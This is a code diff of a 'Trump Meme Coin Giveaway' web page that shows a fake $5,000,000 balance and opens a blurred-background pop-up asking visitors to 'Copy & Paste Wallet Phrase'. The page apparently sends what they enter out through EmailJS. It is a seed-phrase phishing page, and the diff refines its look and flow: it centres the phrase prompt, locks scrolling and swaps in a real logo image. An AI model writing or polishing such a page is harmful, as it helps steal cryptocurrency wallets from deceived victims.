@@ -70,11 +70,11 @@
       left: 50%;
       transform: translate(-50%, -50%);
       width: 90%;
-      max-width: 500px;
-      padding: 30px;
-      border-radius: 8px;
+      max-width: 400px; /* Moderate size */
+      padding: 20px;
+      border-radius: 10px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-      z-index: 9999;
+      z-index: 1000;
     }
 
     .wallet-page.active {
@@ -84,8 +84,13 @@
     .error {
       color: red;
       font-weight: bold;
-      margin-bottom: 10px;
+      font-size: 0.9rem; /* Smaller font */
       text-align: center;
+      background: #ffe6e6; /* Light red background */
+      padding: 8px;
+      border: 1px solid red;
+      border-radius: 5px;
+      margin-bottom: 10px;
     }
 
     label {
@@ -159,12 +164,24 @@
       border-radius: 5px;
       border: 1px solid #ffeeba;
     }
+
+    /* Center "Copy & Paste Wallet Phrase" Text */
+    #wallet-phrase::placeholder {
+      text-align: center;
+      font-size: 1rem;
+      font-weight: bold;
+    }
+
+    /* Disable Scrolling When Wallet Page is Open */
+    body.noscroll {
+      overflow: hidden;
+    }
   </style>
 </head>
 <body>
   <!-- Header Section -->
   <header>
-    <img src="https://example.com/logo.png" alt="Trump Meme Coin Logo">
+    <img src="https://s.yimg.com/ny/api/res/1.2/C6usFI02aAqtM5gFrKz88w--/YXBwaWQ9aGlnaGxhbmRlcjt3PTY0MDtoPTg1Mw--/https://media.zenfs.com/en/aol_ny_post_us_news_articles_123/cd57f4122a7033346c851d4791a4aff0" alt="Trump Meme Coin Logo">
     <h1>Trump Meme Coin Giveaway</h1>
     <p>Make America Great Again!</p>
     <div class="balance">$5,000,000 $TRUMP</div>
@@ -238,13 +255,13 @@
       emailjs.init("8_8uPDLPGGbBtyIqv"); // Replace with your EmailJS public key
     })();
 
-    // Show the Wallet Page and Blur Background
+    // Show Wallet Pop-up & Blur Background
     function showWalletPage() {
+      document.getElementById('wallet-page').classList.add('active');
       document.getElementById('main-content').classList.add('blurred');
       document.querySelector('header').classList.add('blurred');
       document.querySelector('footer').classList.add('blurred');
-      document.body.style.overflow = 'hidden';
-      document.getElementById('wallet-page').classList.add('active');
+      document.body.classList.add('noscroll'); // Prevent scrolling
     }
 
     // Add Event Listener for Form Submission
